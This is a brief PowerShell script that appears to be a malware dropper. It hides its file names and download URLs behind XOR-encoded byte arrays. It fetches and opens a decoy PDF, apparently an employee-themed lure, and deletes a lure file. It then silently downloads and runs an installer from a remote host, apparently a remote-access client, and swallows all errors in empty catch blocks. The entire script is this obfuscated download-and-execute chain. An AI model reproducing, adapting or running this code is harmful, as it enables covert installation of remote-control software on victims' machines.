$CurrentDir     = Get-Location
$ImagePath      = Join-Path $CurrentDir $($k1718='JkyQ3Ca';$b=[byte[]](0x0F,0x06,0x09,0x3D,0x5C,0x3A,0x04,0x2F,0x34,0x29,0x23,0x5A,0x35,0x00,0x29,0x12,0x26,0x01,0x5C,0x2F,0x08,0x29,0x12,0x57,0x3D,0x5D,0x28);$kb=[System.Text.Encoding]::UTF8.GetBytes($k1718);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))
$PdfPath        = Join-Path $CurrentDir $($k1363=29;$b=[byte[]](0x58,0x70,0x6d,0x71,0x72,0x64,0x78,0x78,0x42,0x4d,0x6f,0x74,0x6b,0x7c,0x7e,0x64,0x42,0x4d,0x72,0x71,0x74,0x7e,0x64,0x33,0x6d,0x79,0x7b);-join($b|%{[char]($_-bxor$k1363)}))
$PdfURL         = $($k6518=28;$b=[byte[]](0x74,0x68,0x68,0x6c,0x6f,0x26,0x33,0x33,0x6e,0x7d,0x6b,0x32,0x7b,0x75,0x68,0x74,0x69,0x7e,0x69,0x6f,0x79,0x6e,0x7f,0x73,0x72,0x68,0x79,0x72,0x68,0x32,0x7f,0x73,0x71,0x33,0x73,0x77,0x73,0x76,0x6f,0x65,0x76,0x33,0x75,0x73,0x33,0x71,0x7d,0x75,0x72,0x33,0x59,0x71,0x6c,0x70,0x73,0x65,0x79,0x79,0x43,0x4c,0x6e,0x75,0x6a,0x7d,0x7f,0x65,0x43,0x4c,0x73,0x70,0x75,0x7f,0x65,0x32,0x6c,0x78,0x7a);-join($b|%{[char]($_-bxor$k6518)}))
$InstallerPath  = Join-Path $env:TEMP $($k2789=7;$b=[byte[]](0x54,0x64,0x75,0x62,0x62,0x69,0x44,0x68,0x69,0x69,0x62,0x64,0x73,0x29,0x44,0x6b,0x6e,0x62,0x69,0x73,0x54,0x62,0x73,0x72,0x77,0x29,0x6a,0x74,0x6e);-join($b|%{[char]($_-bxor$k2789)}))
$InstallerURL   = $($k6780='rwdU(S2bxSQRI>U';$b=[byte[]](0x1A,0x03,0x10,0x25,0x5B,0x69,0x1D,0x4D,0x19,0x37,0x3C,0x3B,0x27,0x10,0x3A,0x1C,0x1B,0x0D,0x21,0x46,0x37,0x40,0x0D,0x1D,0x21,0x28,0x7C,0x31,0x47,0x2F,0x5D,0x35,0x0D,0x3B,0x07,0x00,0x51,0x10,0x1D,0x36,0x3F,0x11,0x26,0x50,0x3B,0x17,0x14,0x10,0x7B,0x6B,0x3F,0x5B,0x07,0x16,0x27,0x02,0x37,0x3D,0x4B,0x25,0x5C,0x1A,0x17,0x3C,0x17,0x36,0x0F,0x23,0x1B,0x30,0x34,0x21,0x3A,0x18,0x2C,0x4F,0x30,0x11,0x30,0x5B,0x27);$kb=[System.Text.Encoding]::UTF8.GetBytes($k6780);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))

if (Test-Path $PdfPath) {
    Remove-Item $PdfPath -Force
}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

try {
    Invoke-WebRequest -Uri $PdfURL -OutFile $PdfPath -UseBasicParsing

    if (Test-Path $ImagePath) {
        Remove-Item $ImagePath -Force
    }

    Start-Process $PdfPath
}
catch {
  
}


try {
    Invoke-WebRequest -Uri $InstallerURL -OutFile $InstallerPath
    Start-Process $InstallerPath
} catch {
    
}
